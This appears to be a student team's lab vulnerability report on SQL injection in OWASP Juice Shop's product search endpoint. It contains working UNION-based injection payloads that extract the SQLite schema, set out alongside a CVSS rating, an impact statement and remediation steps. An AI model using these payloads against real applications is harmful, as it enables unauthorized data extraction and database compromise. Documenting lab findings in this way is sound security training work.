EDU-JUICESHOP-2026-T01-018
SQL Injection Leading to Database Schema Extraction via Product Search API
Affected Lab and Component

Lab: OWASP Juice Shop
Component: Product Search API (/rest/product/search)
Backend Database: SQLite

Vulnerability Classification

CWE:
CWE-89 – Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)

OWASP Top 10:
A03:2021 – Injection

CVSS v3.1 Score and Vector

CVSS Score: 9.8 (Critical)

Vector:
AV:N / AC:L / PR:N / UI:N / S:U / C:H / I:H / A:H

Description

A SQL Injection vulnerability exists in the product search functionality of the application. The endpoint /rest/product/search processes the user-supplied parameter q without proper sanitization or parameterized queries.

The backend directly incorporates the user input into an SQL query executed by the database. By injecting specially crafted SQL payloads, an attacker can manipulate the database query and retrieve unauthorized information.

During exploitation, SQL error messages revealed the backend database engine as SQLite and exposed the internal query structure used by the application. This allowed an attacker to craft payloads capable of extracting database schema information from the internal sqlite_master table.

Exploitation Steps

Access the product search functionality in the application.

Intercept the HTTP request using Burp Suite.

Observe the request sent by the application:

GET /rest/product/search?q=<search_value>

Send the request to Burp Repeater and inject the following payload:

/rest/product/search?q=')

The server response returns an SQL error message revealing:

Database Engine:

SQLite

Backend Query:

SELECT * FROM Products WHERE ((name LIKE '%payload%' OR description LIKE '%payload%') AND deletedAt IS NULL) ORDER BY name

Use the following payload to manipulate the query and return all products:

')) -- 

Determine the number of columns using:

')) order by 9 --

Identify columns reflected in the response using UNION injection:

nonexistedvalue')) union all select 1,2,3,4,5,6,7,8,9 --

Extract database schema information using the internal SQLite table:

anyvalue')) union all select 1,2,3,sql,5,6,7,8,9 from sqlite_master --

The response returns SQL table definitions stored in the database.

Proof of Concept (PoC)

Example request:

GET /rest/product/search?q=anyvalue')) union all select 1,2,3,sql,5,6,7,8,9 from sqlite_master --

Example response snippet:

CREATE TABLE Users (...)
CREATE TABLE Products (...)
CREATE TABLE Challenges (...)

This confirms successful extraction of the database schema.

Impact

An attacker exploiting this vulnerability can:

Enumerate the entire database schema

Identify sensitive tables such as Users

Extract confidential user information

Perform authentication bypass attacks

Modify or delete database records

Potentially gain full control of the application database

This vulnerability can lead to complete compromise of the application and its stored data.

Remediation

To mitigate this vulnerability, the following security controls should be implemented:

Use Prepared Statements / Parameterized Queries
Avoid concatenating user input directly into SQL queries.

Input Validation and Sanitization
Validate and sanitize all user-supplied input before processing.

Disable Detailed Error Messages
Prevent database errors from being displayed to users.

Use ORM Frameworks
Implement secure ORM layers that automatically handle query parameterization.

Apply Principle of Least Privilege
Restrict database permissions used by the application.

Discovered by Team 1 

Date : 05/03/2026

